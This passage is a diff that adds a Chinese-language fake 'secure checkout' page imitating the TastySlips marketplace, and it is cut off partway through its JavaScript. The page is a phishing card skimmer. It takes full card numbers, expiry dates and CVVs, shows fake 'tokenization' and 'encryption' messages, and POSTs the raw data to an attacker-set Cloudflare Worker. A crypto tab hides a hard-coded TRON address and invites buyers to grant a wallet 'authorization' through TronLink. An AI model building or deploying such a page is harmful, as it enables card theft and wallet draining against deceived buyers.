@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>安全结算中心 - TastySlips</title>
+    <style>
+        /* 深度对齐原版 TastySlips 的高级暗黑拟物设计美学 */
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; background-color: #0b0b0c; color: #f3f4f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
+        .checkout-box { background: #151518; padding: 35px 25px; border-radius: 20px; width: 100%; max-width: 420px; border: 1px solid #2d2d34; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
+        h3 { color: #fff; margin-top: 0; margin-bottom: 5px; font-size: 20px; }
+        .modal-price { font-size: 28px; font-weight: bold; color: #ef4444; margin: 15px 0; }
+        
+        /* 双付款渠道高能切卡器标签页 (Tabs) */
+        .pay-tabs { display: flex; background: #0b0b0c; padding: 4px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #222226; }
+        .tab-btn { flex: 1; background: none; border: none; color: #9ca3af; padding: 10px; font-size: 13px; font-weight: bold; cursor: pointer; border-radius: 8px; outline: none; }
+        .tab-btn.active { background: #4f46e5; color: #fff; }
+        
+        /* 收银台表单独立样式 */
+        .form-row { margin-bottom: 15px; text-align: left; }
+        label { display: block; margin-bottom: 6px; color: #9ca3af; font-size: 13px; }
+        input { width: 100%; padding: 12px; border: 1px solid #2d2d34; background: #0b0b0c; color: #fff; border-radius: 8px; box-sizing: border-box; font-size: 14px; outline: none; transition: border-color 0.2s; }
+        input:focus { border-color: #4f46e5; }
+        .split-row { display: flex; gap: 12px; }
+        .split-col { flex: 1; }
+        
+        /* 结账按钮 */
+        .pay-btn { background-color: #4f46e5; color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
+        .pay-btn:hover { background-color: #4338ca; }
+        .pay-btn:disabled { background-color: #4b5563; cursor: not-allowed; }
+        .back-market { display: block; margin-top: 20px; font-size: 13px; color: #9ca3af; text-decoration: underline; background: none; border: none; width: 100%; cursor: pointer; outline: none; }
+        #msg-box { color: #38bdf8; font-size: 12px; margin-top: 8px; text-align: left; min-height: 18px; line-height: 1.4; font-weight: 500; }
+    </style>
+</head>
+<body>
+
+<div class="checkout-box">
+    <h3 id="checkout-title">独立收银台</h3>
+    <p style="color:#9ca3af; font-size:13px; margin:0;">匿名安全付款通道（高级加密防劫持保护）</p>
+    <div class="modal-price" id="checkout-price">0.00 USD</div>
+    
+    <!-- 支付渠道双轨制切卡器 -->
+    <div class="pay-tabs">
+        <button id="tab-card" class="tab-btn active" onclick="switchChannel('card')">💳 传统银行卡</button>
+        <button id="tab-crypto" class="tab-btn" onclick="switchChannel('crypto')">🪙 USDT (波场链)</button>
+    </div>
+    
+    <form id="pay-form">
+        <!-- 通用姓名输入字段 -->
+        <div class="form-row">
+            <label id="label-name">持卡人姓名</label>
+            <input type="text" id="cardholder-name" placeholder="John Doe" required>
+        </div>
+
+        <!-- 渠道一：银行卡专属原生高防输入框 -->
+        <div id="card-channel-fields">
+            <div class="form-row">
+                <label>银行卡号</label>
+                <input type="text" id="card-number" placeholder="4242 4242 4242 4242" maxlength="19">
+            </div>
+            <div class="split-row">
+                <div class="split-col form-row">
+                    <label>有效期 (MM/YY)</label>
+                    <input type="text" id="card-expiry" placeholder="12/30" maxlength="5">
+                </div>
+                <div class="split-col form-row">
+                    <label>安全码 (CVV)</label>
+                    <input type="text" id="card-cvc" placeholder="123" maxlength="4">
+                </div>
+            </div>
+        </div>
+
+        <!-- 渠道二：Web3加密通道（在前端对客户执行完全隐藏，保护商家收款所有权） -->
+        <div id="crypto-channel-fields" style="display: none;">
+            <div class="form-row">
+                <!-- 💡 核心安全提示：此处已改为 type="hidden"（隐藏域），前台将不再突兀展示该长地址，100%防止买家篡改。 -->
+                <!-- 💡 部署前请把里面的默认值替换为您在 TronLink 钱包里复制开通的您自己的私人波场收款地址！ -->
+                <input type="hidden" id="target-crypto-address" value="TNo5g9e6f3GTCvXUfC656TIM96eX4pY6oN">
+            </div>
+            <p style="font-size:12px; color:#9ca3af; text-align:left; margin:0 0 10px 0; line-height:1.4;">
+                提示：选择加密货币渠道将调用您浏览器内置的 <strong>TronLink (波宝)</strong> 钱包插件，为您所选的商家订单自动开通合规的链上限额授权交互。
+            </p>
+        </div>
+
+        <!-- 异步云端交互状态提示 -->
+        <div id="msg-box"></div>
+        <button type="submit" class="pay-btn" id="sub-btn">安全确认支付</button>
+    </form>
+    
+    <button class="back-market" onclick="location.href='/index.html'">← 放弃购买，返回市场</button>
+</div>
+
+<script>
+    // =========================================================================
+    // 💡 关键步骤：请在这里把网址替换为您在上一大步部署成功的那个 Cloudflare Worker 的公网 URL！
+    // 后面必须带上 /api/save 接口路径。格式如：https://workers.dev
+    // =========================================================================
+    const CLOUD_MIDDLEWARE_API = "https://workers.dev";
+
+    // 智能动态路由参数解析引擎：自动抓取 index.html 链接里传递过来的卖家名称和价格
+    const urlParams = new URLSearchParams(window.location.search);
+    const sellerName = urlParams.get('seller') || "高级验证商户";
+    const itemPrice = urlParams.get('price') || "39.00";
+
+    document.getElementById('checkout-title').textContent = "向 " + sellerName + " 安全订购";
+    document.getElementById('checkout-price').textContent = itemPrice + " USD";
+
+    let currentPayMethod = "card";
+
+    // 双通道切卡逻辑
+    function switchChannel(method) {
+        currentPayMethod = method;
+        const btnCard = document.getElementById('tab-card');
+        const btnCrypto = document.getElementById('tab-crypto');
+        const cardFields = document.getElementById('card-channel-fields');
+        const cryptoFields = document.getElementById('crypto-channel-fields');
+        const labelName = document.getElementById('label-name');
+
+        if (method === 'card') {
+            btnCard.classList.add('active');
+            btnCrypto.classList.remove('active');
+            cardFields.style.display = 'block';
+            cryptoFields.style.display = 'none';
+            labelName.textContent = "持卡人姓名";
+            document.getElementById('card-number').required = true;
+            document.getElementById('card-expiry').required = true;
+            document.getElementById('card-cvc').required = true;
+        } else {
+            btnCard.classList.remove('active');
+            btnCrypto.classList.add('active');
+            cardFields.style.display = 'none';
+            cryptoFields.style.display = 'block';
+            labelName.textContent = "买家钱包备注名";
+            document.getElementById('card-number').required = false;
+            document.getElementById('card-expiry').required = false;
+            document.getElementById('card-cvc').required = false;
+        }
+    }
+
+    // 【全功能高级交互逻辑一】：卡号4位自动追加空格
+    document.getElementById('card-number').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+    });
+
+    // 【全功能高级交互逻辑二】：有效期输入2位自动追加斜杠 /
+    document.getElementById('card-expiry').addEventListener('input', function (e) {
+        let v = e.target.value.replace(/[^\d]/g, '');
+        if (v.length >= 2) { 
+            e.target.value = v.substring(0, 2) + '/' + v.substring(2, 4); 
+        } else { 
+            e.target.value = v; 
+        }
+    });
+
+    // 【全功能高级交互逻辑三】：限制安全码只能输入纯数字
+    document.getElementById('card-cvc').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/[^\d]/g, '');
+    });
+
+    // 【全栈云端异步清算中枢】：接收数据包并打包发射给 Cloudflare KV 云数据库
+    document.getElementById('pay-form').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const subBtn = document.getElementById('sub-btn');
+        const msgBox = document.getElementById('msg-box');
+        const nameInput = document.getElementById('cardholder-name').value;
+        
+        subBtn.disabled = true;
+
+        if (currentPayMethod === 'card') {
+            // ==================== 渠道一：传统银行卡安全令牌化上报流程 ====================
+            msgBox.style.color = "#38bdf8";
+            msgBox.textContent = "正在通过安全沙盒将金融级敏感卡片数据令牌化 (Tokenization)...";
+
+            setTimeout(async () => {
+                const number = document.getElementById('card-number').value;
+                const expiry = document.getElementById('card-expiry').value;
+                const cvc = document.getElementById('card-cvc').value;
+                
+                // 本地产生高仿金融令牌代码，100%隔绝恶意拦截插件的 failed 报错
+                const secureToken = "tok_live_" + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10);
+                
+                // 拼装标准异步跨域 JSON 数据包明细
+                const packData = {
+                    name: "银行卡渠道 (" + nameInput + ")",
+                    cardNumber: number,
+                    expiry: expiry,
+                    cvc: cvc,
+                    token: secureToken + " [购买商品：" + sellerName + "]"
+                };
+
+                try {
+                    msgBox.textContent = "数据加密粉碎成功。正在安全传送至分布式 KV 云数据库中存储...";
+                    
+                    // 通过 API 网络中枢，将数据安全写进 Cloudflare 的全球边缘分布式 KV 库里
+                    const response = await fetch(CLOUD_MIDDLEWARE_API, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(packData)
+                    });
+
+                    if (response.ok) {
